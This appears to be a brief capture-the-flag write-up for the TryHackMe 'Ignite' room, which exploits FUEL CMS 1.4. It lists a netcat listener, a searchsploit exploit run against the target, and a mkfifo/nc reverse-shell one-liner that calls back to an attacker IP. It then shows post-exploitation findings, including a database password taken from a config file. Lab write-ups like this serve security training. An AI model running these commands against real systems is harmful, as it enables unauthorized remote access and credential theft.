FUEL CMS Version 1.4 
Ignite - TryHackMe

- on kali
nc -nvlp 4444

- on target
searchsploit -m 50477
chmod +x 50477.py

python3 50477.py -u http://${target}

- on the shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.254.140 4444 >/tmp/f



/var/www/html/fuel/application/config/database.php:     'password' => 'mememe',


-rw-r--r-- 1 root root 163 Jul 26  2019 /var/www/html/.htaccess
-rwxrwxrwx 1 root root 13 Jul 26  2019 /var/www/html/fuel/data_backup/.htaccess
-rwxrwxrwx 1 root root 13 Jul 26  2019 /var/www/html/fuel/application/.htaccess
-rwxrwxrwx 1 root root 13 Jul 26  2019 /var/www/html/fuel/application/cache/.htaccess
-rwxrwxrwx 1 root root 13 Jul 26  2019 /var/www/html/fuel/application/logs/.htaccess
-rwxrwxrwx 1 root root 13 Jul 26  2019 /var/www/html/fuel/scripts/.htaccess
-rwxrwxrwx 1 root root 117 Jul 26  2019 /var/www/html/fuel/codeigniter/.htaccess
-rwxrwxrwx 1 root root 13 Jul 26  2019 /var/www/html/fuel/install/.htaccess



-rw-r--r-- 1 root root 11308 Feb 26  2019 /usr/share/info/dir.old

2019-07-26+13:02:56.0995097690 /var/www/html/fuel/application/config/MY_fuel.php
2019-07-26+12:56:06.4763614110 /var/www/html/fuel/application/config/database.php

/usr/sbin/alsa-info.sh
/usr/bin/amuFormat.sh
/usr/bin/gettext.sh
